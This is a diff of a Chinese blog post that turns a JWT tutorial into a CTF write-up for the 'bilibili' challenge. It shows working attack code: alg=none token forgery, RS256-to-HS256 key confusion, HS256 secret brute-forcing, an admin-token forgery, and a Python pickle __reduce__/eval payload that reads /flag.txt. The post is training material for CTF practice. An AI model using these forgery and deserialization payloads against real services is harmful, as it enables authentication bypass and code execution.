@@ -74,7 +74,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2k</span>
+            <span class="post-count">2.6k</span>
         </span>
     </span>
 
@@ -83,7 +83,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">8 分钟</span>
+            <span class="post-count">11 分钟</span>
         </span>
     </span>
 </div>
@@ -111,10 +111,25 @@
       <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gg77oqkz42j31hc0u0jzn.jpg" alt="46"></p>
 <a id="more"></a>
 
-<h3 id="0x00-什么是JWT"><a href="#0x00-什么是JWT" class="headerlink" title="0x00 什么是JWT"></a>0x00 什么是JWT</h3><p>JWT是Json Web Token的缩写，主要用于验证用户身份信息及跨域的身份验证。</p>
-<h3 id="0x01-JWT构成部分"><a href="#0x01-JWT构成部分" class="headerlink" title="0x01 JWT构成部分"></a>0x01 JWT构成部分</h3><p>JWT一般是由三部分组成。</p>
+<h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>起因：刷题的过程中看见一道题写着kunkun应援团，有应援口号，并集资11540必须买lv6?</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15s0dz6j319x0bzwga.jpg" alt="image-20201207161800908"></p>
+<p>滋滋滋，干就完事。</p>
+<p>注册了账号，去购物车翻找lv6的商品，由于页数过多，用了个小脚本找到了lv6的商品在181页</p>
+<p>脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from urllib import request</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;220.249.52.133:47108&#x2F;shop?page&#x3D;&quot;</span><br><span class="line">for i in range(1,501):</span><br><span class="line">    r &#x3D; request.urlopen(url+str(i))</span><br><span class="line">    if &quot;lv6.png&quot; in r.read().decode(&#39;utf-8&#39;):</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;lv6 is not in page &quot;+str(i))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15vgbczj31390u0ag2.jpg" alt="image-20201209034830267"></p>
+<p>抓包修改一波价格</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz165lwhij31gs0k8doe.jpg" alt="image-20201209040320580"></p>
+<p>修改失败，提示操作失败，但发现有一次返回为302，并附带一个目录，访问后发现只允许admin访问</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15tgqy5j316b0u0jtb.jpg" alt="image-20201209145832195"></p>
+<p>并且包中发现网站是通过JWT进行身份验证。无奈想请教一波大佬，结果大佬忙，只得自己研究一波JWT。。。</p>
+<h3 id="0x00-JWT基础"><a href="#0x00-JWT基础" class="headerlink" title="0x00 JWT基础"></a>0x00 JWT基础</h3><p>百度介绍JWT是Json Web Token的缩写，主要用于验证用户身份信息及跨域的身份验证。</p>
+<p>而JWT一般是由三部分组成，并使用base64编码组成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">以下为完整的JWT认证信息。</span><br><span class="line">JWT&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlRpbWUifQ.2YosC1XgEHYbLonkRpX49gi3Lqnr4dngsThwnBGvhwA</span><br><span class="line"></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    					标头</span><br><span class="line">eyJ1c2VybmFtZSI6IlRpbWUifQ												payload</span><br><span class="line">2YosC1XgEHYbLonkRpX49gi3Lqnr4dngsThwnBGvhwA				签名</span><br></pre></td></tr></table></figure>
+
 <h4 id="Header-标头"><a href="#Header-标头" class="headerlink" title="Header(标头)"></a>Header(标头)</h4><p>​    标头通常由两部分组成：令牌的类型和所使用的签名算法，例如HMACSHA256或RSA</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Header头部承载两部分信息</span><br><span class="line">	1、声明类型，JWT</span><br><span class="line">	2、声明加密算法	</span><br><span class="line"></span><br><span class="line">header &#x3D; &#39;&#123;</span><br><span class="line">		&quot;alg&quot;:&quot;HS256&quot;,&#x2F;&#x2F;算法</span><br><span class="line">		&quot;typ&quot;:&quot;JWT&quot; &#x2F;&#x2F;JWT传递</span><br><span class="line">		&#125;&#39;</span><br><span class="line">		</span><br><span class="line">使用base64URL编码，形成JWT的第一部分</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Header头部承载两部分信息</span><br><span class="line">	1、声明类型，JWT</span><br><span class="line">	2、声明加密算法	</span><br><span class="line"></span><br><span class="line">header &#x3D; &#39;&#123;</span><br><span class="line">		&quot;alg&quot;:&quot;HS256&quot;,</span><br><span class="line">		&quot;typ&quot;:&quot;JWT&quot; </span><br><span class="line">		&#125;&#39;</span><br><span class="line">		</span><br><span class="line">使用base64URL编码，形成JWT的第一部分</span><br></pre></td></tr></table></figure>
 
 <h4 id="Payload-有效载荷"><a href="#Payload-有效载荷" class="headerlink" title="Payload(有效载荷)"></a>Payload(有效载荷)</h4><p>​    主体信息(有效载荷)，其中包含声明，声明是有关实体(一般是用户)和其他数据的声明。索赔有以下三种类型：</p>
 <p>注册的，公共的和私人权利</p>
@@ -148,17 +163,19 @@
 
 
 
-<h3 id="0x03-Python生成jwt-web-token"><a href="#0x03-Python生成jwt-web-token" class="headerlink" title="0x03 Python生成jwt web token"></a>0x03 Python生成jwt web token</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#头信息</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">"alg"</span>:<span class="string">"HS256"</span>,</span><br><span class="line">    <span class="string">"typ"</span>:<span class="string">"jwt"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">payloda = &#123;</span><br><span class="line">    <span class="string">"iat"</span>:time.time(),</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"admin"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#调用jwt库，生成json web token</span></span><br><span class="line"><span class="comment">#							 秘钥      加密算法</span></span><br><span class="line">jwt_token = jwt.encode(payload,<span class="string">"1121"</span>,algorithm=<span class="string">"HS256"</span>,headers=head).decode(<span class="string">'ascii'</span>)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">print(jwt_token)</span><br></pre></td></tr></table></figure>
+<p>Python生成jwt web token</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#头信息</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">"alg"</span>:<span class="string">"HS256"</span>,</span><br><span class="line">    <span class="string">"typ"</span>:<span class="string">"jwt"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">payloda = &#123;</span><br><span class="line">    <span class="string">"iat"</span>:time.time(),</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"admin"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#调用jwt库，生成json web token</span></span><br><span class="line"><span class="comment">#							 秘钥      加密算法</span></span><br><span class="line">jwt_token = jwt.encode(payload,<span class="string">"1121"</span>,algorithm=<span class="string">"HS256"</span>,headers=head).decode(<span class="string">'ascii'</span>)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">print(jwt_token)</span><br></pre></td></tr></table></figure>
 
 <p>生成的token</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1OTUwNzM1NDguNjcyNzk2LCJuYW1lIjoiYWRtaW4ifQ.m_f32qmeuFTCugdPBfMA1jGmpkXWoI3Vjt-sY30_xrw</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x04-Python解密JWT"><a href="#0x04-Python解密JWT" class="headerlink" title="0x04 Python解密JWT"></a>0x04 Python解密JWT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#需要解码的token</span></span><br><span class="line">jwt_token = <span class="string">"eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1OTUwNzM1NDguNjcyNzk2LCJuYW1lIjoiYWRtaW4ifQ.m_f32qmeuFTCugdPBfMA1jGmpkXWoI3Vjt-sY30_xrw"</span></span><br><span class="line"></span><br><span class="line">data = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#							 秘钥</span></span><br><span class="line">    data = jwt.decode(jwt_token,<span class="string">"1121"</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
+<p>Python解密JWT</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#需要解码的token</span></span><br><span class="line">jwt_token = <span class="string">"eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1OTUwNzM1NDguNjcyNzk2LCJuYW1lIjoiYWRtaW4ifQ.m_f32qmeuFTCugdPBfMA1jGmpkXWoI3Vjt-sY30_xrw"</span></span><br><span class="line"></span><br><span class="line">data = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#							 秘钥</span></span><br><span class="line">    data = jwt.decode(jwt_token,<span class="string">"1121"</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
 
 <p>解密内容</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;iat&#39;: 1595073548.672796, &#39;name&#39;: &#39;admin&#39;&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x05-攻击手法"><a href="#0x05-攻击手法" class="headerlink" title="0x05 攻击手法"></a>0x05 攻击手法</h3><h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><p>因header和payload部分是使用可逆的base64方法编码，所以只要获取到令牌就可以将前两个部分解密后读取内容。</p>
+<h3 id="0x01-攻击手法"><a href="#0x01-攻击手法" class="headerlink" title="0x01 攻击手法"></a>0x01 攻击手法</h3><h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><p>因header和payload部分是使用可逆的base64方法编码，所以只要获取到令牌就可以将前两个部分解密后读取内容。</p>
 <p>解密方法</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Linux base64 </span><br><span class="line">	echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d</span><br><span class="line"> 		&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br><span class="line"></span><br><span class="line">浏览器JavaScript控制台</span><br><span class="line">	atob(&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot;)</span><br><span class="line"> 		&quot;&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;&quot;</span><br><span class="line"></span><br><span class="line">Powershell</span><br><span class="line">	[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String</span><br><span class="line">	(&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot;))</span><br><span class="line">		&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br><span class="line">		</span><br><span class="line">Python</span><br><span class="line">	import base64</span><br><span class="line">	print(base64.b64decode(&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&#39;))</span><br><span class="line">		&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br></pre></td></tr></table></figure>
 
@@ -167,44 +184,70 @@
 <h4 id="修改签名算法-none"><a href="#修改签名算法-none" class="headerlink" title="修改签名算法(none)"></a>修改签名算法(none)</h4><p>JWT签名算法可确保JWT在传输过程中不会被恶意用户所篡改，但头部的alg字段可以改为none，若服务器支持签名算法为none，服务器会在JWT中删除相应的签名数据（这时，JWT就会只含有头部 + ‘.’ + 有效载荷 + ‘.’），然后将其提交给服务器。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">源码：https:&#x2F;&#x2F;github.com&#x2F;Sjord&#x2F;jwtdemo</span><br><span class="line">dmeo：http:&#x2F;&#x2F;demo.sjoerdlangkemper.nl&#x2F;jwtdemo&#x2F;hs256.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxfipcuumj319x0bzabr.jpg" alt="image-20200720143830616"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15rhdvpj31dy0u0qa9.jpg" alt="image-20200720143830616"></p>
 <p>发送上面的JWT令牌</p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxfk7d7myj30re0jx409.jpg" alt="image-20200720143958715"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1gm36zdj30re0jx75u.jpg" alt="image-20200720143958715"></p>
 <p>将alg修改为none</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#头信息</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">"alg"</span>:<span class="string">"none"</span>,</span><br><span class="line">    <span class="string">"typ"</span>:<span class="string">"jwt"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"iat"</span>:time.time(),</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"time"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#调用jwt库，生成json web token</span></span><br><span class="line">jwt_token = jwt.encode(payload,<span class="string">""</span>,algorithm=<span class="string">"none"</span>,headers=head).decode(<span class="string">'ascii'</span>)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">print(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成令牌</span></span><br><span class="line"><span class="comment">#eyJ0eXAiOiJqd3QiLCJhbGciOiJub25lIn0.eyJpYXQiOjE1OTUyMjgwNzEuNjk0MjQ1LCJuYW1lIjoidGltZSJ9.</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxfzr7t71j30pr0gcgn0.jpg" alt="image-20200720145455991"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15xlvefj30pr0gcta0.jpg" alt="image-20200720145455991"></p>
 <h4 id="修改RS256算法为HS256"><a href="#修改RS256算法为HS256" class="headerlink" title="修改RS256算法为HS256"></a>修改RS256算法为HS256</h4><p>HS256算法使用密钥为所有消息进行签名和验证，而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。这样的话，后端代码使用RSA公钥+HS256算法进行签名验证。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">demo:http:&#x2F;&#x2F;demo.sjoerdlangkemper.nl&#x2F;jwtdemo&#x2F;rs256.php</span><br><span class="line">公钥：http:&#x2F;&#x2F;demo.sjoerdlangkemper.nl&#x2F;jwtdemo&#x2F;public.pem</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxj6ohnsgj30xn09rgmr.jpg" alt="image-20200720164522770"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz168sw60j30xn09r3zn.jpg" alt="image-20200720164522770"></p>
 <p>获取网站公钥，将算法改为HS256然后使用泄露的公钥进行签名，服务器会使用HS256和泄露的公钥进行验证。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">key = [</span><br><span class="line">    <span class="string">"-----BEGIN PUBLIC KEY-----"</span>,</span><br><span class="line">    <span class="string">"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqi8TnuQBGXOGx/Lfn4JF"</span>,</span><br><span class="line">    <span class="string">"NYOH2V1qemfs83stWc1ZBQFCQAZmUr/sgbPypYzy229pFl6bGeqpiRHrSufHug7c"</span>,</span><br><span class="line">    <span class="string">"1LCyalyUEP+OzeqbEhSSuUss/XyfzybIusbqIDEQJ+Yex3CdgwC/hAF3xptV/2t+"</span>,</span><br><span class="line">    <span class="string">"H6y0Gdh1weVKRM8+QaeWUxMGOgzJYAlUcRAP5dRkEOUtSKHBFOFhEwNBXrfLd76f"</span>,</span><br><span class="line">    <span class="string">"ZXPNgyN0TzNLQjPQOy/tJ/VFq8CQGE4/K5ElRSDlj4kswxonWXYAUVxnqRN1LGHw"</span>,</span><br><span class="line">    <span class="string">"2G5QRE2D13sKHCC8ZrZXJzj67Hrq5h2SADKzVzhA8AW3WZlPLrlFT3t1+iZ6m+aF"</span>,</span><br><span class="line">    <span class="string">"KwIDAQAB"</span>,</span><br><span class="line">    <span class="string">"-----END PUBLIC KEY-----"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = <span class="string">"\n"</span> . join(key)</span><br><span class="line"></span><br><span class="line">jwt_token = jwt.encode(&#123;<span class="string">"data"</span>:<span class="string">"time"</span>&#125;,algorithm=<span class="string">"HS256"</span>,key=key+<span class="string">"\n"</span>).decode(<span class="string">"ascii"</span>)</span><br><span class="line"></span><br><span class="line">print(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment">#jwt：eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoidGltZSJ9.CAyhfU2pH5L1Ua-bferA4XGvcpwOjxUpG6PkiQ5GYBQ</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxj8782ymj30ok0ca74z.jpg" alt="image-20200720164650350"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz167yeirj30ok0caaar.jpg" alt="image-20200720164650350"></p>
 <h4 id="破解HS256密钥"><a href="#破解HS256密钥" class="headerlink" title="破解HS256密钥"></a>破解HS256密钥</h4><p>如果HS256密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥，例如将密钥字符串用作PyJWT库示例代码中的密钥的时候情况就是如此。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">安装pyjwt</span><br><span class="line">	pip3 install pyjwt</span><br><span class="line">爆破脚本</span><br><span class="line">	https:&#x2F;&#x2F;github.com&#x2F;Devllench&#x2F;jwtbrute</span><br><span class="line">字典：</span><br><span class="line">	https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;danielmiessler&#x2F;SecLists&#x2F;master&#x2F;Passwords&#x2F;Common-Credentials&#x2F;10-million-password-list-top-1000000.txt</span><br><span class="line"></span><br><span class="line">命令格式：</span><br><span class="line">	python jwtbrute.py  回车</span><br><span class="line">	input token: jwt令牌</span><br><span class="line">	input wordlist: 字典</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxp0e1tcyj30mw02n0sw.jpg" alt="image-20200720200655836"></p>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxp1r8842j30my0dk40u.jpg" alt="image-20200720200814835"></p>
-<h3 id="0x06-CTF练习"><a href="#0x06-CTF练习" class="headerlink" title="0x06 CTF练习"></a>0x06 CTF练习</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">练习地址：</span><br><span class="line">https:&#x2F;&#x2F;www.root-me.org&#x2F;?page&#x3D;recherche&amp;lang&#x3D;fr&amp;recherche&#x3D;jwt</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15w53cmj30mw02nmxt.jpg" alt="image-20200720200655836"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15szm37j30my0dkdhp.jpg" alt="image-20200720200814835"></p>
+<h3 id="0x02-攻防世界9分题-bilibili"><a href="#0x02-攻防世界9分题-bilibili" class="headerlink" title="0x02 攻防世界9分题-bilibili"></a>0x02 攻防世界9分题-bilibili</h3><p>了解了一波JWT，继续完成我们的kunkun集资应援，之前我们获得了一串JWT加密信息如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JWT&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlRpbWUifQ.2YosC1XgEHYbLonkRpX49gi3Lqnr4dngsThwnBGvhwA</span><br></pre></td></tr></table></figure>
+
+<p>去jwt.io解密，将username中的Time改成admin，重新生成密文</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1gcr45cj31ie0u0dlm.jpg" alt="image-20201209143150204"></p>
+<p>报错500，失败，使用py脚本尝试爆破秘钥</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15zluufj31gg0rcwnl.jpg" alt="image-20201209143456886"></p>
+<p>使用上面给出的脚本即可，成功爆出秘钥为1Kun。</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1gjb8c5j31440n077l.jpg" alt="image-20201209145301256"></p>
+<p>在jwt.io重新生成秘钥后，替换当前JWT密文<br><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz161qdsmj31cl0u00zy.jpg" alt="image-20201209145452818"></p>
+<p>替换重新生成的JWT后，成功访问到admin页面</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1gdul93j31ce0u0tif.jpg" alt="image-20201209150058175"></p>
+<p>一番查找后发现网页源代码中有网站源码</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1gg1xsqj310l0u04if.jpg" alt="image-20201209150206245"></p>
+<p>下载后发现是使用python编写的网站源码。。。。莫不是要做python的代码审计？？？？</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1ggb5jcj30hk0rgjte.jpg" alt="image-20201209150349929"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz15y0sw6j309r040wee.jpg" alt=""></p>
+<p>9分题果然不是我等菜鸟能做出来的，只能祭出Writeup大法，看看python是如何审计的。</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1ggrxojj305i05cmx6.jpg" alt="我一进来就看见常威在打来福_常威_来福_进来_看见表情- 发表情- fabiaoqing.com"></p>
+<p>我一看wp就发现大佬直接扔出来了一个脚本跑flag。</p>
+<p>flag脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a &#x3D; pickle.dumps(payload())</span><br><span class="line">a&#x3D; urllib.quote(a)</span><br><span class="line">print a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行后得到：c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz166h5c7j32hk0re186.jpg" alt="image-20201209151439605"></p>
+<p>成功，但我是不会让大家知道我做此题花费多长时间</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glz1gk52nsj31oc0u0jw6.jpg" alt="image-20201209151609840"></p>
